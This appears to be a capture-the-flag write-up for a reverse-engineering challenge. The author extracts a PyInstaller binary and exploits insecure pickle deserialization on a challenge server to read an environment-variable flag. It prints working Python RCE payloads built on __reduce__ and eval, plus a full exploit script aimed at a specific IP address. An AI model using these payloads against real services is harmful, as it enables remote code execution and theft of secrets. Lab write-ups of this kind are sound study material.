# Greetings 2 - Reverse Engineering Writeup

This was the sequel to the first Greetings challenge. The description said "The communication channel seems to be a direct line to a suspected Faction server. See if you can infiltrate their systems and find out more." That immediately told me this wasn't just about static analysis - there was a live server involved.

I extracted the zip and got another binary called `greetings`. Just like the first challenge, I checked the file type and confirmed it was an ELF binary:

```bash
xxd greetings | head
```

Started with `7F 45 4C 46` - another PyInstaller binary. I ran pyinstxtractor on it:

```bash
python pyinstxtractor.py greetings
```

The extraction worked and I got the `greetings.pyc` bytecode file. Time to see what was different from the first challenge. I analyzed the bytecode for strings:

```python
with open('greetings_extracted/greetings.pyc', 'rb') as f:
    data = f.read()
    text = data.decode('latin-1', errors='ignore')
```

Found some interesting stuff:
- URL: `http://138.199.163.92:13696/api`
- References to `pickle.dumps`
- References to `requests.post`
- The string "What is your name warrior?"
- A `.hex()` method call

So the client-side code was taking user input, pickling it, converting to hex, and sending it to an API endpoint. The server-side was probably doing `pickle.loads(bytes.fromhex(obj))` to deserialize it.

This screamed **pickle deserialization vulnerability**. Pickle is notoriously dangerous because it can execute arbitrary code during deserialization if you control the serialized data.

I tested the API first to understand its behavior:

```python
import requests

r = requests.post("http://138.199.163.92:13696/api", json={"obj": "test"})
# Response: "Error processing obj"
```

The server expected a hex-encoded pickle object. Time to craft a malicious payload. In Python, you can create a pickle object that executes code by implementing the `__reduce__` method:

```python
import pickle

class RCE:
    def __reduce__(self):
        return (eval, ("open('/app/flag.txt').read()",))

payload = pickle.dumps(RCE()).hex()
```

When the server unpickles this, it will call `eval("open('/app/flag.txt').read()")` and execute it. I tried various file locations:

```python
locations = ['/flag', '/app/flag', '/flag.txt', '/app/flag.txt']

for loc in locations:
    class RCE:
        def __reduce__(self):
            return (eval, (f"open('{loc}').read()",))
    
    payload = pickle.dumps(RCE()).hex()
    r = requests.post(URL, json={"obj": payload})
```

When I tried `/app/flag.txt`, I got a 200 response:

```
Good luck in the battle The flag is an environment variable :)!
```

Classic CTF troll! The flag wasn't in a file - it was in an environment variable. I modified my payload to read environment variables:

```python
class RCE:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').environ.get('FLAG', 'not found')",))

payload = pickle.dumps(RCE()).hex()
r = requests.post(URL, json={"obj": payload})
```

Response:

```
Good luck in the battle Kaal{Ins3cur3_R3duc1ng}!
```

Got it! The flag name "Insecure Reducing" is a reference to Python's `__reduce__` method, which is what makes pickle deserialization so dangerous. When you pickle an object, Python calls `__reduce__()` to determine how to serialize it. When unpickling, it uses that information to reconstruct the object - but if you control the pickled data, you can make it execute arbitrary code.

The vulnerability chain was:
1. Client pickles user input and sends it as hex to the API
2. Server deserializes with `pickle.loads(bytes.fromhex(obj))`
3. No validation on the pickled data
4. Attacker can craft malicious pickle with `__reduce__` to execute code
5. RCE achieved, read environment variables to get flag

Here's the complete exploit:

```python
#!/usr/bin/env python3
import requests
import pickle
import re

URL = "http://138.199.163.92:13696/api"

# Create malicious pickle payload
class RCE:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').environ.get('FLAG', 'not found')",))

# Serialize and convert to hex (matching client-side format)
payload = pickle.dumps(RCE()).hex()

# Send to vulnerable API
r = requests.post(URL, json={"obj": payload})

# Extract flag
flag = re.search(r'Kaal\{[^}]+\}', r.text).group(0)
print(f"[+] FLAG: {flag}")
```

Flag: Kaal{Ins3cur3_R3duc1ng}

Team Exploit4
